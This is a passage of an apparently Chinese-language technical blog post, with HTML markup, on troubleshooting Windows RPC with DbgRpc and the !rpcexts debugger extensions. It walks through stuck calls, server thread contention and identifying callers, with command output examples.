class=&quot;line&quot;&gt;00c4 0000.0038 00 008 8d9f4e40 0000.0015 00000001 00000803 0018485c 0000.003b&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.003c 00 00b 82273fdc 0000.0034 00000009 baadf00d 0001f956 00a8.0244&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.003d 00 008 82273fdc 0000.0034 00000009 baadf00d 0001ff02 01b8.037c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.0009 00 002 e60c73e6 0000.0013 00000009 baadf00d 0005a371 00ec.031c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.000a 00 002 0b0a6584 0000.0002 00000009 baadf00d 000126ae 00c4.0130&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.000c 00 002 0b0a6584 0000.0010 00000009 baadf00d 00012bc4 022c.0290&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.000d 00 003 00000136 0000.001b 00000009 baadf00d 0005ba71 00ec.0310&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.000e 00 000 412f241e 0000.0002 00000009 baadf00d 00012f21 02a8.029c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.0010 00 003 00000136 0000.0013 00000009 00000003 000341da 0370.0060&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.0011 00 006 e60c73e6 0000.001b 00000009 baadf00d 000f1d00 0370.0328&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.0017 00 002 0b0a6584 0000.001b 00000009 baadf00d 0006c803 0278.0184&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.001a 00 004 00000136 0000.0012 00000001 baadf00d 00038e9b 00ec.0348&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00ec 0000.0006 00 009 00000134 0000.0011 00000009 baadf00d 000b233f 0170.0244&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00ec 0000.000b 00 001 2f5f6520 0000.001c 00000009 baadf00d 00035510 00ec.0334&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00ec 0000.000e 00 001 629b9f66 0000.0014 00000009 baadf00d 00035813 00ec.01c4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00ec 0000.0012 00 000 629b9f66 0000.0014 00000009 baadf00d 00026cc6 00a8.0164&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00ec 0000.001b 00 001 2f5f6520 0000.0004 00000001 baadf00d 000352c1 00ec.03a8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;02a8 0000.0004 00 009 00000134 0000.0002 00000009 baadf00d 0009a540 0170.0244&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0370 0000.0006 00 003 00000134 0000.0005 0000000b baadf00d 0002e7cd 00ec.0350&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0370 0000.0008 00 009 00000134 0000.0007 0000000b 01cee9e4 000838fa 0170.0244&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0278 0000.0004 02 000 19bb5061 0000.0002 00000001 00000001 00072c09 0000.0003&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;For details on the optional parameters, see DbgRpc Command-Line Options.&lt;br&gt;For a similar example using the RPC debugger extensions, see !rpcexts.getcallinfo.&lt;/p&gt;
&lt;h2 id=&quot;获取RPC客户端调用信息&quot;&gt;&lt;a href=&quot;#获取RPC客户端调用信息&quot; class=&quot;headerlink&quot; title=&quot;获取RPC客户端调用信息&quot;&gt;&lt;/a&gt;获取RPC客户端调用信息&lt;/h2&gt;&lt;p&gt;使用!rpcexts.getclientcallinfo获取客户端调用信息，或者DbgRpc的-a开关。&lt;br&gt;也有四个参数可选。其中三个CallID，IfStart，ProcNum是用来跟中RPC调用来标记信息的。第四个参数ProcessID是属于这个调用的进程的Pid。你可以使用你知道的参数值来缩小搜索。&lt;br&gt;如果没有参数指定，系统中所有可知的CCALLs都会显示。例子：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;D:\wmsg&amp;gt;dbgrpc -a&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Searching for call info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID  CELL ID   PNO  IFSTART  TIDNUMBER CALLID   LASTTIME PS CLTNUMBER ENDPOINT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;------------------------------------------------------------------------------&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0390 0000.0001 0000 19bb5061 0000.0000 00000001 00072bff 07 0000.0002 1120&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;For details on the optional parameters, see DbgRpc Command-Line Options.&lt;br&gt;For a similar example using the RPC debugger extensions, see !rpcexts.getclientcallinfo.&lt;/p&gt;
&lt;p&gt;注意：&lt;br&gt;只有在全部状态信息都收集的时候，才有CCALLS的信息。&lt;/p&gt;
&lt;h1 id=&quot;常用的RPC调试技术&quot;&gt;&lt;a href=&quot;#常用的RPC调试技术&quot; class=&quot;headerlink&quot; title=&quot;常用的RPC调试技术&quot;&gt;&lt;/a&gt;常用的RPC调试技术&lt;/h1&gt;&lt;p&gt;下面将介绍4中常见的RPC问题。RPC状态信息可以用来检查这些问题。&lt;br&gt;DbgRpc和RPC调试扩展命令都可以使用。&lt;/p&gt;
&lt;h2 id=&quot;分析一个Stuck（卡）调用问题&quot;&gt;&lt;a href=&quot;#分析一个Stuck（卡）调用问题&quot; class=&quot;headerlink&quot; title=&quot;分析一个Stuck（卡）调用问题&quot;&gt;&lt;/a&gt;分析一个Stuck（卡）调用问题&lt;/h2&gt;&lt;p&gt;当一个进程直接或间接的进行一次RPC调用时，等待（holding）一个critical section或者资源时通过会出现这个问题。在这种情况下，RPC调用会到另一个进程或者机器，然后派遣到管理接口（服务接口）中，这个会等待很久。这导致调用方会出现等待超时。&lt;/p&gt;
&lt;p&gt;当通过调试器检查时，RPC是这个等待线程的最高层，但是不清楚究竟在等待什么。&lt;br&gt;下面是一个这种堆栈的例子，有很多可能性。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:002&amp;gt; ~1k&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ChildEBP RetAddr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fba0 77e9e8eb ntdll!ZwWaitForSingleObject+0xb&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fbc8 4efeff73 KERNEL32!WaitForSingleObjectEx+0x5a&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fbe8 4eff0012 RPCRT4!UTIL_WaitForSyncIO+0x21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fc0c 4efe6e2b RPCRT4!UTIL_GetOverlappedResultEx+0x44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fc44 4ef973bf RPCRT4!WS_SyncRecv+0x12a&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fc68 4ef98d5a RPCRT4!OSF_CCONNECTION__TransSendReceive+0xcb&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fce4 4ef9b682 RPCRT4!OSF_CCONNECTION__SendFragment+0x297&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fd38 4ef9a5a8 RPCRT4!OSF_CCALL__SendNextFragment+0x272&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fd88 4ef9a9cb RPCRT4!OSF_CCALL__FastSendReceive+0x165&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fda8 4ef9a7f8 RPCRT4!OSF_CCALL__SendReceiveHelper+0xed&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fdd4 4ef946a7 RPCRT4!OSF_CCALL__SendReceive+0x37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fdf0 4efd56b3 RPCRT4!I_RpcSendReceive+0xc4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068fe08 01002850 RPCRT4!NdrSendReceive+0x4f&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068ff40 01001f32 rtclnt+0x2850&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068ffb4 77e92ca8 rtclnt+0x1f32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0068ffec 00000000 KERNEL32!CreateFileA+0x11b&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是怎么检查这个问题。&lt;br&gt;&lt;strong&gt;Troubleshooting a stuck call problem&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1- 保证调试器正在调试有这个stuck cell的进程。（是那个可能在等待RPC的线程所属的进程）&lt;br&gt;2- 或者线程的堆栈指针。堆栈就像上面例子中显示的那样，这个例子的堆栈指针是0x0068FBA0&lt;br&gt;3- 获取这个线程的调用信息。通过!rpcexts.rpcreadstack加上堆栈指针作为参数来获取。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:001&amp;gt; !rpcexts.rpcreadstack 68fba0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;CallID: 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;IfStart: 19bb5061&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ProcNum: 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Protocol Sequence:      &amp;quot;ncacn_ip_tcp&amp;quot;  (Address: 00692ED8)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;NetworkAddress: &amp;quot;&amp;quot;      (Address: 00692F38)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Endpoint:       &amp;quot;1120&amp;quot;  (Address: 00693988)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;显示的这些信息可以让你跟踪这个调用。&lt;/p&gt;
&lt;p&gt;4- 网络地址是空的，标明是本地机器。Endpoint是1120。需要确认哪个进程拥有这个endpoint。通过!rpcexts.getendpointinfo加上endpoint作为参数来获取 //应该是客户端&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:001&amp;gt; !rpcexts.getendpointinfo 1120&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Searching for endpoint info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID  CELL ID   ST PROTSEQ        ENDPOINT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;--------------------------------------------&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0278 0000.0001 01            TCP 1120&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;5- 根据前面的信息，可以看到进程0x278拥有这个endpoint，可以通过!rpcexts.getcallinfo&lt;br&gt;获取到这个call的所有信息，需要加上四个参数CallID, IfStart, and ProcNum（3步骤已经知道）和进程pid 0x278&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:001&amp;gt; !rpcexts.getcallinfo 1 19bb5061 0 278&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Searching for call info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID  CELL ID   ST PNO IFSTART  TIDNUMBER CALLFLAG CALLID   LASTTIME CONN/CLN&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;----------------------------------------------------------------------------&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0278 0000.0004 02 000 19bb5061 0000.0002 00000001 00000001 00072c09 0000.0003&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;6- 第5步的信息非常有用，但是有些信息太少了。第二列给出的cell id是0000.0004。如果&lt;br&gt;!rpcexts.getdbgcell加上这个cell id，可以显示更易读的cell信息：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:001&amp;gt; !rpcexts.getdbgcell 278 0.4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Getting cell info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Call&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Status: Dispatched&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Procedure Number: 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Interface UUID start (first DWORD only): 19BB5061&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Call ID: 0x1 (1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Servicing thread identifier: 0x0.2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Call Flags: cached&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Last update time (in seconds since boot):470.25 (0x1D6.19)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Owning connection identifier: 0x0.3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;信息显示这个调用已经”dispatched”，表示已经离开了RPC运行时。最后更新时间是470.25，通过!rpcexts.rpctime可以看到现在的时间。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:001&amp;gt; !rpcexts.rpctime&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Current time is: 6003, 422&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;表示这次call的最后联系在5533秒之前了，接近92分钟，因此这个肯定是一个stuck call。&lt;/p&gt;
&lt;p&gt;7- 在挂载到服务端进程之前，你可以使用Servicing thread identifier找到当前处理这个call的线程信息。也就是另一个cell number，第6步中的0x0.2，可以像下面一样使用：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:001&amp;gt; !rpcexts.getdbgcell 278 0.2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Getting cell info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Thread&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Status: Dispatched&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Thread ID: 0x1A4 (420)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Last update time (in seconds since boot):470.25 (0x1D6.19)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;现在你知道你要找的是0x278进程的0x1A4线程。&lt;/p&gt;
&lt;p&gt;可能这个线程已经在做其他的RPC调用了，你又必要重复这个过程跟踪这个call。&lt;/p&gt;
&lt;p&gt;##跟踪服务端进程的Contention（争用）&lt;/p&gt;
&lt;p&gt;为了能够处理发来的请求，RPC报了一个工作线程集合。理论上这个线程数量很小。然后理想的情况只存在实验室环境下，这些服务管理函数非常小心和谐（。。。）。在真实情况下，线程的数量决定于服务端的工作量，不过不管怎么样都在1-50的范围内。&lt;br&gt;如果工作线程数量超过了50，可能服务端进程有过多的竞争。通过引起这个的是heap的胡乱使用，内存的压力，或者服务端大部分的活动都通过一个单独的临界区。&lt;br&gt;使用!rpcexts.getthreadinfo获取服务进程的线程数量，或者DbgRpc的-t选项。需要指定进程ID，如下面的0xC4&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;D:\wmsg&amp;gt;dbgrpc -t -P c4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Searching for thread info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID  CELL ID   ST TID      LASTTIME&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-----------------------------------&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0004 03 0000011c 000f164f&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0007 03 00000120 008a6290&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0015 03 0000018c 008a6236&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0026 03 00000264 0005c443&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.002d 03 00000268 000265bb&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0030 03 0000026c 000f1d32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0034 03 00000388 007251e9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在这个例子中，只有7个工作线程，是合理的。&lt;br&gt;如果有超过100个线程，就需要加载调试器看看问题了。&lt;br&gt;Note  Running queries such as dbgrpc -t remotely is expensive to the server and the network. If you use this query in a script, you should make sure this command is not run too often.&lt;/p&gt;
&lt;h2 id=&quot;检查Struct的线程&quot;&gt;&lt;a href=&quot;#检查Struct的线程&quot; class=&quot;headerlink&quot; title=&quot;检查Struct的线程&quot;&gt;&lt;/a&gt;检查Struct的线程&lt;/h2&gt;&lt;p&gt;RPC需要它的工作线程来完成正常的工作，通常有个问题，在同一个进程中的组件会因为等待一个公共的临界区死锁（比如，loader lock或者heap lock）。这将导致很多线程暂停，很有可能也有RPC工作线程。&lt;br&gt;如果出现了这种情况，RPC服务器不会再给外界响应。RPC调用将返回RPC_S_SERVER_UNAVAILABLE或者RPC_S_SERVER_TOO_BUSY&lt;/p&gt;
&lt;p&gt;一个很小的问题可能会硬气有问题的驱动阻止IRPs完成，到达RPC服务器。&lt;br&gt;如果你怀疑可能出现了这个问题，使用DbgRpc –t或者!rpcexts.getthreadinfo需要进程PID作为参数。下面的列子是0xC4:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;D:\wmsg&amp;gt;dbgrpc -t -P c4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Searching for thread info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID  CELL ID   ST TID      LASTTIME&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-----------------------------------&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0004 03 0000011c 000f164f&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0007 03 00000120 008a6290&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0015 03 0000018c 008a6236&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0026 03 00000264 0005c443&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.002d 03 00000268 000265bb&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0030 03 0000026c 000f1d32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0034 03 00000388 007251e9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;TID那一列给出了每个线程的ID。LATSTIME列包含每个线程最近状态改变的时间戳。&lt;br&gt;只要服务器收到一个请求，至少有一个线程会改变状态，时间戳就会更新。因此，一个RPC请求失败了，但是没有任何一个线程的时间戳改变，表示这个请求没有到达RPC运行时中。你需要在研究是什么引起的。&lt;/p&gt;
&lt;h2 id=&quot;在服务端标明调用者&quot;&gt;&lt;a href=&quot;#在服务端标明调用者&quot; class=&quot;headerlink&quot; title=&quot;在服务端标明调用者&quot;&gt;&lt;/a&gt;在服务端标明调用者&lt;/h2&gt;&lt;p&gt;有些时候需要确认谁发送的RPC请求，虽然你只有这次调用的服务线程信息。&lt;br&gt;这个非常有用-比如，找到谁传递了不合法的参数给RPC调用。&lt;br&gt;根据某些特别依赖于协议序列的调用，你可以或者不同程度的细节，而有些协议根本没有这些信息（比如NetBiso）&lt;/p&gt;
&lt;p&gt;Identifying the caller from the server thread&lt;br&gt;1- 打开用户模式调试器，挂载到目标服务线程中&lt;br&gt;2- 通过|命令获取到进程id&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:001&amp;gt; |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0     id: 3d4 name: rtsvr.exe&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3- !rpcexts.getcallinfo获取到进程中存在的calls。需要指定进程ID 0x3D4&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:001&amp;gt; !rpcexts.getcallinfo 0 0 FFFF 3d4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Searching for call info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID  CELL ID   ST PNO IFSTART  THRDCELL  CALLFLAG CALLID   LASTTIME CONN/CLN&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;----------------------------------------------------------------------------&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;03d4 0000.0004 02 000 19bb5061 0000.0002 00000001 00000001 00a1aced 0000.0003&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;查找状态时2或1（dispatched或active）的调用。在这个例子中，只有一个call，如果有更多的，你可以使用!rpcexts.getdbgcell加上cell number（THRDCELL列）来获取线程IDs，从而你可以决定哪个是你感兴趣的调用了&lt;/p&gt;
